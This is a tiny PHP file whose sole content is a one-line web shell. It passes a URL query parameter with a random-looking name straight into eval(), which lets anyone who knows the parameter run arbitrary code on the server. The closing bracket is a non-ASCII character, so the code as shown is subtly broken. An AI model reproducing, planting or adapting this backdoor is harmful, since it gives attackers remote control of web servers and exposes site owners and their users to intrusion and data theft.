<?php
eval($_GET['akRRM5Gv'〕);
?>
